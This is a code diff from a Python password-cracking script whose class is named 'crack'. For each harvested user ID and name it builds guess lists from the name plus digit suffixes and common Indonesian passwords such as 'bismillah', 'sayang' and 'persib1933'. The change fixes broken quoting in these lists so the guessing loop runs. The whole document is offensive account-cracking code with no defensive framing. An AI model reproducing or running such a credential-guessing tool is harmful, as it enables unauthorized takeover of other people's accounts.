@@ -160,7 +160,7 @@ class crack:
 				for email in id:
 					uid,name=email.split("|")
 					if(len(str(name.lower()))>=6):
-						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','name.lower()+'54321',name.lower()+'321','bismillah','sayang','sayangku','cintaku','kontol','indonesia','persib1933','bandung','bangsat','rahasia']
+						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'54321',name.lower()+'321','bismillah','sayang','sayangku','cintaku','kontol','indonesia','persib1933','bandung','bangsat','rahasia']
 					elif(len(str(name.lower()))<=2):
 						pw=[name.lower()+'1234',name.lower()+'12345','bismillah']
 					elif(len(str(name.lower()))<=3):
@@ -180,7 +180,7 @@ class crack:
 				for email in id:
 					uid,name=email.split("|")
 					if(len(str(name.lower()))>=6):
-						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','name.lower()+'54321','name.lower()+'321','bismillah','sayang','sayangku','cintaku','kontol','indonesia','persib1933','bandung','bangsat','rahasia']
+						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',name.lower()+'54321',name.lower()+'321','bismillah','sayang','sayangku','cintaku','kontol','indonesia','persib1933','bandung','bangsat','rahasia']
 					elif(len(str(name.lower()))<=2):
 						pw=[name.lower()+'1234',name.lower()+'12345','bismillah']
 					elif(len(str(name.lower()))<=3):
